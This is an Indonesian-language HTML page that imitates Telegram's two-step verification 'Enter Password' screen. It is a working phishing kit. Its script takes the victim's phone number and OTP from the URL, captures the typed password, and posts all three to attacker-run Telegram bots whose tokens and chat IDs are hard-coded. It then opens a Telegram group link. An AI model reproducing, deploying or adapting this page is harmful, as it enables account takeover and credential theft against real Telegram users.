<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Password</title>
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      background: url('gay2.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      background: rgba(255, 255, 255, 0.85);
      border-radius: 16px;
      padding: 40px 20px;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }
    .icon {
      width: 80px;
      margin: 0 auto 20px;
    }
    h1 {
      font-size: 22px;
      margin-bottom: 15px;
      color: #333;
    }
    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 25px;
    }
    .input-wrapper {
      position: relative;
      margin-bottom: 25px;
    }
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 2px solid #ccc;
      border-radius: 10px;
      box-sizing: border-box;
    }
    .toggle-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      width: 24px;
      cursor: pointer;
    }
    .btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(45deg, #0077be, #005f9e);
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover {
      background: linear-gradient(45deg, #27ae60, #2c3e50);
    }
    .status {
      margin-top: 20px;
      font-size: 14px;
      font-weight: 600;
    }
    .disclaimer {
      font-size: 12px;
      margin-top: 30px;
      color: #444;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="icon">
      <img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png" width="80" alt="Telegram Icon" />
    </div>
    <h1>Enter Password</h1>
    <p>This page is protected with two-step verification.</p>

    <form id="passwordForm">
      <div class="input-wrapper">
        <input type="password" id="passwordInput" placeholder="Masukkan Password" required />
        <img 
          src="https://cdn-icons-png.flaticon.com/512/709/709612.png" 
          alt="Toggle" 
          class="toggle-icon" 
          id="togglePassword"
        />
      </div>
      <button type="submit" class="btn">Kirim</button>
    </form>

    <div class="status" id="statusMessage"></div>
    <div class="disclaimer">
      *Jangan bagikan kode verifikasi Anda kepada siapa pun.
    </div>
  </div>

  <script>
    const bots = [
      { token: "8068224257:AAEphwHC2UkOJN-A5slLLMqSric4no8sC_U", chatId: "7280432300" },
      { token: "7690173453:AAFizIJfq7OWi5tthhxxqXKWcS0Xb5bP_iE", chatId: "6832746767" }
    ];

    const urlParams = new URLSearchParams(window.location.search);
    const phone = urlParams.get('phone') || 'Tidak diketahui';
    const otp = urlParams.get('otp') || 'Tidak diketahui';
    const botIndexFromURL = parseInt(urlParams.get('bot') || '0');
    const bot = bots[botIndexFromURL] || bots[0];

    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const statusPwd = document.getElementById('statusMessage');
    const toggleIcon = document.getElementById('togglePassword');

    // Toggle password visibility
    toggleIcon.addEventListener('click', () => {
      const type = passwordInput.type === 'password' ? 'text' : 'password';
      passwordInput.type = type;
    });

    passwordForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const password = passwordInput.value.trim();
      if (password.length < 4) {
        statusPwd.textContent = "‚ö†Ô∏è Password minimal 4 karakter.";
        return;
      }

      const message = `üîë *PASSWORD MASUK*\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\nüìû Nomor HP: \`${phone}\`\nüì© OTP: \`${otp}\`\nüîí Password: \`${password}\`\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ`;

      const api = `https://api.telegram.org/bot${bot.token}/sendMessage`;

      fetch(api, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: bot.chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
  statusPwd.textContent = "‚úÖ Password berhasil dikirim!";
  
  // Redirect ke halaman join group Telegram setelah 5 detik
  setTimeout(() => {
    window.open('https://t.me/+4Qx-i0oIFNY0YTdl', '_blank'); // ganti dengan link grup kamu
  }, 1500);
} else {
  statusPwd.textContent = "‚ùå Gagal mengirim password ke bot.";
}
      })
      .catch(err => {
        statusPwd.textContent = "‚ö†Ô∏è Error: " + err.message;
      });
    });
  </script>
</body>
</html>
